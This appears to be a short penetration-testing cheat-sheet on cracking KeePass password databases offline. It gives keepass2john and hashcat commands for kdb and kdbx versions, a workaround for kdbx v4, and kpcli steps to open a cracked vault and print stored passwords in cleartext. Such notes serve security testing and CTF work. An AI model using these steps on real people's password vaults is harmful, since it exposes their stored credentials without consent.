# KeePass Database Cracking

KeePass databases (`.kdb` v1, `.kdbx` v2/v3/v4) can be cracked offline if the master password is weak.

```bash
# .kdbx v2/v3 — standard keepass2john works:
keepass2john database.kdbx | tee database.hash
hashcat -m 13400 database.hash /usr/share/wordlists/rockyou.txt

# .kdbx v4 (file version 0x00040000) — keepass2john from standard packages fails:
keepass2john database.kdbx   # → "File version '40000' is currently not supported!"

# Fix: use the snap version:
sudo snap install john-the-ripper
john-the-ripper.keepass2john database.kdbx | tee database.hash
hashcat -m 13400 database.hash /usr/share/wordlists/rockyou.txt

# .kdb v1:
keepass2john database.kdb | tee database.hash
hashcat -m 13400 database.hash /usr/share/wordlists/rockyou.txt
# Note: keepass2john inlines the kdb file — check output format

# Open the database (Linux GUI-free):
kpcli --kdb database.kdbx --pw '<MASTERPASS>'
kpcli:/> ls
kpcli:/> cd <GROUP>/
kpcli:/> show -f <ENTRY>   # shows password in cleartext
```
